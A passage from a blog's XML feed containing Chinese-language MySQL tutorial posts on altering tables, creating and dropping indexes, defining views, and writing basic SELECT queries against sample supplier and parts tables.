class="keyword">PRIMARY KEY</span> (column_name);</span><br></pre></td></tr></table></figure><h3 id="添加-FOREIGN-KEY"><a href="#添加-FOREIGN-KEY" class="headerlink" title="添加 FOREIGN KEY"></a>添加 FOREIGN KEY</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> child_table</span><br><span class="line"><span class="keyword">ADD CONSTRAINT</span> fk_name</span><br><span class="line"><span class="keyword">FOREIGN KEY</span> (column_name)</span><br><span class="line"><span class="keyword">REFERENCES</span> parent_table (column_name);</span><br></pre></td></tr></table></figure><h3 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> employees  </span><br><span class="line">RENAME <span class="keyword">TO</span> staff;</span><br></pre></td></tr></table></figure><h3 id="看了那么多-分别看看实力-无实力"><a href="#看了那么多-分别看看实力-无实力" class="headerlink" title="看了那么多 分别看看实力(无实力)"></a>看了那么多 分别看看实力(无实力)</h3><blockquote><p>继续利用之前的 四个表分别看看实力</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- P表</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+-------+--------+</span></span><br><span class="line"><span class="operator">|</span> PNO <span class="operator">|</span> PNAME     <span class="operator">|</span> color <span class="operator">|</span> weight <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+-------+--------+</span></span><br><span class="line"><span class="operator">|</span> P1  <span class="operator">|</span> 螺母      <span class="operator">|</span> 红    <span class="operator">|</span> <span class="number">12</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P2  <span class="operator">|</span> 螺栓      <span class="operator">|</span> 绿    <span class="operator">|</span> <span class="number">17</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P3  <span class="operator">|</span> 螺丝刀    <span class="operator">|</span> 蓝    <span class="operator">|</span> <span class="number">14</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P4  <span class="operator">|</span> 螺丝刀    <span class="operator">|</span> 红    <span class="operator">|</span> <span class="number">14</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P5  <span class="operator">|</span> 凸轮      <span class="operator">|</span> 蓝    <span class="operator">|</span> <span class="number">40</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P6  <span class="operator">|</span> 齿轮      <span class="operator">|</span> 红    <span class="operator">|</span> <span class="number">30</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+-------+--------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 改一个表名吧</span></span><br><span class="line"><span class="keyword">ALTER TABLE</span> P RENAME <span class="keyword">TO</span> PIG;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Pig;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+-------+--------+</span></span><br><span class="line"><span class="operator">|</span> PNO <span class="operator">|</span> PNAME     <span class="operator">|</span> color <span class="operator">|</span> weight <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+-------+--------+</span></span><br><span class="line"><span class="operator">|</span> P1  <span class="operator">|</span> 螺母      <span class="operator">|</span> 红    <span class="operator">|</span> <span class="number">12</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P2  <span class="operator">|</span> 螺栓      <span class="operator">|</span> 绿    <span class="operator">|</span> <span class="number">17</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P3  <span class="operator">|</span> 螺丝刀    <span class="operator">|</span> 蓝    <span class="operator">|</span> <span class="number">14</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P4  <span class="operator">|</span> 螺丝刀    <span class="operator">|</span> 红    <span class="operator">|</span> <span class="number">14</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P5  <span class="operator">|</span> 凸轮      <span class="operator">|</span> 蓝    <span class="operator">|</span> <span class="number">40</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P6  <span class="operator">|</span> 齿轮      <span class="operator">|</span> 红    <span class="operator">|</span> <span class="number">30</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+-------+--------+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 改一个列名</span></span><br><span class="line"><span class="keyword">alter table</span> pig change <span class="keyword">column</span> color color1 <span class="type">varchar</span>(<span class="number">50</span>);</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pig;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+--------+--------+</span></span><br><span class="line"><span class="operator">|</span> PNO <span class="operator">|</span> PNAME     <span class="operator">|</span> color1 <span class="operator">|</span> weight <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+--------+--------+</span></span><br><span class="line"><span class="operator">|</span> P1  <span class="operator">|</span> 螺母      <span class="operator">|</span> 红     <span class="operator">|</span> <span class="number">12</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P2  <span class="operator">|</span> 螺栓      <span class="operator">|</span> 绿     <span class="operator">|</span> <span class="number">17</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P3  <span class="operator">|</span> 螺丝刀    <span class="operator">|</span> 蓝     <span class="operator">|</span> <span class="number">14</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P4  <span class="operator">|</span> 螺丝刀    <span class="operator">|</span> 红     <span class="operator">|</span> <span class="number">14</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P5  <span class="operator">|</span> 凸轮      <span class="operator">|</span> 蓝     <span class="operator">|</span> <span class="number">40</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P6  <span class="operator">|</span> 齿轮      <span class="operator">|</span> 红     <span class="operator">|</span> <span class="number">30</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+--------+--------+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 加一个列</span></span><br><span class="line"><span class="keyword">alter table</span> pig <span class="keyword">add</span> <span class="keyword">column</span> num <span class="type">int</span>;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pig;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+--------+--------+------+</span></span><br><span class="line"><span class="operator">|</span> PNO <span class="operator">|</span> PNAME     <span class="operator">|</span> color1 <span class="operator">|</span> weight <span class="operator">|</span> num  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+--------+--------+------+</span></span><br><span class="line"><span class="operator">|</span> P1  <span class="operator">|</span> 螺母      <span class="operator">|</span> 红     <span class="operator">|</span> <span class="number">12</span>     <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P2  <span class="operator">|</span> 螺栓      <span class="operator">|</span> 绿     <span class="operator">|</span> <span class="number">17</span>     <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P3  <span class="operator">|</span> 螺丝刀    <span class="operator">|</span> 蓝     <span class="operator">|</span> <span class="number">14</span>     <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P4  <span class="operator">|</span> 螺丝刀    <span class="operator">|</span> 红     <span class="operator">|</span> <span class="number">14</span>     <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P5  <span class="operator">|</span> 凸轮      <span class="operator">|</span> 蓝     <span class="operator">|</span> <span class="number">40</span>     <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P6  <span class="operator">|</span> 齿轮      <span class="operator">|</span> 红     <span class="operator">|</span> <span class="number">30</span>     <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+--------+--------+------+</span></span><br><span class="line"><span class="comment">-- 删除列</span></span><br><span class="line"><span class="keyword">alter table</span> pig <span class="keyword">drop</span> num;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pig;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+--------+--------+</span></span><br><span class="line"><span class="operator">|</span> PNO <span class="operator">|</span> PNAME     <span class="operator">|</span> color1 <span class="operator">|</span> weight <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+--------+--------+</span></span><br><span class="line"><span class="operator">|</span> P1  <span class="operator">|</span> 螺母      <span class="operator">|</span> 红     <span class="operator">|</span> <span class="number">12</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P2  <span class="operator">|</span> 螺栓      <span class="operator">|</span> 绿     <span class="operator">|</span> <span class="number">17</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P3  <span class="operator">|</span> 螺丝刀    <span class="operator">|</span> 蓝     <span class="operator">|</span> <span class="number">14</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P4  <span class="operator">|</span> 螺丝刀    <span class="operator">|</span> 红     <span class="operator">|</span> <span class="number">14</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P5  <span class="operator">|</span> 凸轮      <span class="operator">|</span> 蓝     <span class="operator">|</span> <span class="number">40</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P6  <span class="operator">|</span> 齿轮      <span class="operator">|</span> 红     <span class="operator">|</span> <span class="number">30</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+--------+--------+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 改个属性</span></span><br><span class="line"><span class="keyword">alter table</span> pig modify <span class="keyword">column</span> color1 <span class="type">varchar</span>(<span class="number">40</span>);</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pig;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+--------+--------+</span></span><br><span class="line"><span class="operator">|</span> PNO <span class="operator">|</span> PNAME     <span class="operator">|</span> color1 <span class="operator">|</span> weight <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+--------+--------+</span></span><br><span class="line"><span class="operator">|</span> P1  <span class="operator">|</span> 螺母      <span class="operator">|</span> 红     <span class="operator">|</span> <span class="number">12</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P2  <span class="operator">|</span> 螺栓      <span class="operator">|</span> 绿     <span class="operator">|</span> <span class="number">17</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P3  <span class="operator">|</span> 螺丝刀    <span class="operator">|</span> 蓝     <span class="operator">|</span> <span class="number">14</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P4  <span class="operator">|</span> 螺丝刀    <span class="operator">|</span> 红     <span class="operator">|</span> <span class="number">14</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P5  <span class="operator">|</span> 凸轮      <span class="operator">|</span> 蓝     <span class="operator">|</span> <span class="number">40</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> P6  <span class="operator">|</span> 齿轮      <span class="operator">|</span> 红     <span class="operator">|</span> <span class="number">30</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+-----------+--------+--------+</span></span><br><span class="line"><span class="comment">-- 删除表</span></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="keyword">drop</span> <span class="keyword">table</span> pig;<span class="operator">*</span><span class="operator">*</span></span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="keyword">drop</span> <span class="keyword">table</span> s;<span class="operator">*</span><span class="operator">*</span></span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="keyword">drop</span> <span class="keyword">table</span> j;<span class="operator">*</span><span class="operator">*</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> 数据库SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-索引</title>
      <link href="/2024/05/03/sql4/"/>
      <url>/2024/05/03/sql4/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240503173125.png" alt="image.png"></p><h3 id="简单看看"><a href="#简单看看" class="headerlink" title="简单看看"></a>简单看看</h3><blockquote><p>MySQL 索引是一种数据结构，用于加快数据库查询的速度和性能。<br>MySQL 索引的建立对于 MySQL 的高效运行是很重要的，索引可以大大提高 MySQL 的检索速度。</p></blockquote><ul><li>单列索引，即一个索引只包含单个列，一个表可以有多个单列索引。</li><li>组合索引，即一个索引包含多个列。</li></ul><h2 id="查看一个表有哪些-indexs"><a href="#查看一个表有哪些-indexs" class="headerlink" title="查看一个表有哪些 indexs"></a>查看一个表有哪些 indexs</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> INDEXES <span class="keyword">FROM</span> SPJ;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> INDEX index_name</span><br><span class="line"><span class="keyword">ON</span> table_name (column1 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], column2 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ...);</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> `<span class="keyword">CREATE</span> INDEX`: 用于创建普通索引的关键字。</span><br><span class="line"><span class="operator">-</span> `index_name`: 指定要创建的索引的名称。索引名称在表中必须是唯一的。</span><br><span class="line"><span class="operator">-</span> `table_name`: 指定要在哪个表上创建索引。</span><br><span class="line"><span class="operator">-</span> `(column1, column2, ...)`: 指定要索引的表列名。你可以指定一个或多个列作为索引的组合。这些列的数据类型通常是数值、文本或日期。</span><br><span class="line"><span class="operator">-</span> `<span class="keyword">ASC</span>`和`<span class="keyword">DESC</span>`（可选）: 用于指定索引的排序顺序。默认情况下，索引以升序（<span class="keyword">ASC</span>）排序。</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> INDEX index_name (column1 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], column2 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ...);</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> `<span class="keyword">ALTER TABLE</span>`: 用于修改表结构的关键字。</span><br><span class="line"><span class="operator">-</span> `table_name`: 指定要修改的表的名称。</span><br><span class="line"><span class="operator">-</span> `<span class="keyword">ADD</span> INDEX`: 添加索引的子句。`<span class="keyword">ADD</span> INDEX`用于创建普通索引。</span><br><span class="line"><span class="operator">-</span> `index_name`: 指定要创建的索引的名称。索引名称在表中必须是唯一的。</span><br><span class="line"><span class="operator">-</span> `(column1, column2, ...)`: 指定要索引的表列名。你可以指定一个或多个列作为索引的组合。这些列的数据类型通常是数值、文本或日期。</span><br><span class="line"><span class="operator">-</span> `<span class="keyword">ASC</span>`和`<span class="keyword">DESC</span>`（可选）: 用于指定索引的排序顺序。默认情况下，索引以升序（<span class="keyword">ASC</span>）排序。</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE TABLE</span> table_name (</span><br><span class="line">  column1 data_type,</span><br><span class="line">  column2 data_type,</span><br><span class="line">  ...,</span><br><span class="line">  INDEX index_name (column1 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], column2 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ...)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> `<span class="keyword">CREATE TABLE</span>`: 用于创建新表的关键字。</span><br><span class="line"><span class="operator">-</span> `table_name`: 指定要创建的表的名称。</span><br><span class="line"><span class="operator">-</span> `(column1, column2, ...)`: 定义表的列名和数据类型。你可以指定一个或多个列作为索引的组合。这些列的数据类型通常是数值、文本或日期。</span><br><span class="line"><span class="operator">-</span> `INDEX`: 用于创建普通索引的关键字。</span><br><span class="line"><span class="operator">-</span> `index_name`: 指定要创建的索引的名称。索引名称在表中必须是唯一的。</span><br><span class="line"><span class="operator">-</span> `(column1, column2, ...)`: 指定要索引的表列名。你可以指定一个或多个列作为索引的组合。这些列的数据类型通常是数值、文本或日期。</span><br><span class="line"><span class="operator">-</span> `<span class="keyword">ASC</span>`和`<span class="keyword">DESC</span>`（可选）: 用于指定索引的排序顺序。默认情况下，索引以升序（<span class="keyword">ASC</span>）排序。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">creat index fast <span class="keyword">on</span> spj();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="删除一个索引"><a href="#删除一个索引" class="headerlink" title="删除一个索引"></a>删除一个索引</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> index <span class="keyword">first</span> <span class="keyword">on</span> spj;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据库SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-视图创建</title>
      <link href="/2024/05/03/sql3/"/>
      <url>/2024/05/03/sql3/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240503173030.png" alt="image.png"></p><hr><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">### <span class="keyword">SQL</span> <span class="keyword">CREATE</span> <span class="keyword">VIEW</span> 语法</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> view_name <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br><span class="line"><span class="keyword">with</span> <span class="keyword">check</span> option</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span>参数说明：<span class="operator">*</span><span class="operator">*</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">CREATE</span> <span class="keyword">VIEW</span>:<span class="operator">*</span><span class="operator">*</span> 声明你要创建一个视图。</span><br><span class="line"><span class="operator">-</span> <span class="operator">*</span><span class="operator">*</span>view_name:<span class="operator">*</span><span class="operator">*</span> 指定视图的名称。</span><br><span class="line"><span class="operator">-</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">AS</span>:<span class="operator">*</span><span class="operator">*</span> 指定关键字，表示视图的定义开始。</span><br><span class="line"><span class="operator">-</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">SELECT</span> column1, column2, ...:<span class="operator">*</span><span class="operator">*</span> 指定视图中包含的列，可以是表中的列或计算列。</span><br><span class="line"><span class="operator">-</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">FROM</span> table_name:<span class="operator">*</span><span class="operator">*</span> 指定视图从哪个表中获取数据。</span><br><span class="line"><span class="operator">-</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">WHERE</span> <span class="keyword">condition</span>:<span class="operator">*</span><span class="operator">*</span> 可选部分，用于指定筛选条件，限制视图中的行。</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span>注释：<span class="operator">*</span><span class="operator">*</span>视图总是显示最新的数据！每当用户查询视图时，数据库引擎通过使用视图的 <span class="keyword">SQL</span> 语句重建数据。</span><br></pre></td></tr></table></figure><h3 id="删除视图"><a href="#删除视图" class="headerlink" title="删除视图:"></a>删除视图:</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> name;   </span><br></pre></td></tr></table></figure><h2 id="更新视图"><a href="#更新视图" class="headerlink" title="更新视图"></a>更新视图</h2><blockquote><p>其实此时 是一种怎么说呢 ?<br>就是 更新就是 update delete insert 嘛<br>此时就是需要考虑在创建 时的with check option<br>很重要的一步 视图消解 有个with check option<br>在更新视图时候就会考虑创建视图时候的<br>条件   </p></blockquote><h2 id="看看实力"><a href="#看看实力" class="headerlink" title="看看实力"></a>看看实力</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> LS <span class="keyword">as</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> s;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> a <span class="keyword">as</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> spj;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> b <span class="keyword">as</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> s;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据库SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-表增删查改</title>
      <link href="/2024/05/03/sql2/"/>
      <url>/2024/05/03/sql2/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240503172334.png"></p><h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><h3 id="单表查询"><a href="#单表查询" class="headerlink" title="单表查询"></a>单表查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name;</span><br><span class="line"></span><br><span class="line">与</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span>参数说明：<span class="operator">*</span><span class="operator">*</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> <span class="operator">*</span><span class="operator">*</span>column1, column2, ...<span class="operator">*</span><span class="operator">*</span>：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。</span><br><span class="line"><span class="operator">-</span> <span class="operator">*</span><span class="operator">*</span>table_name<span class="operator">*</span><span class="operator">*</span>：要查询的表名称。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 参数说明</span></span><br><span class="line"><span class="keyword">DISTINCT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="where-子句"><a href="#where-子句" class="headerlink" title="where 子句"></a>where 子句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WHERE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>&#x3D;</td><td>等于</td></tr><tr><td>&lt;&gt;</td><td>不等于。注释：在 SQL 的一些版本中，该操作符可被写成 !&#x3D;</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于</td></tr><tr><td>BETWEEN and</td><td>在某个范围内</td></tr><tr><td>LIKE</td><td>搜索某种模式</td></tr><tr><td>IN</td><td>指定针对某个列的多个可能值</td></tr><tr><td>and</td><td>or 不用多说</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="order-by字句"><a href="#order-by字句" class="headerlink" title="order by字句"></a>order by字句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> column1, column2, ... <span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><h2 id="实力"><a href="#实力" class="headerlink" title="实力"></a>实力</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 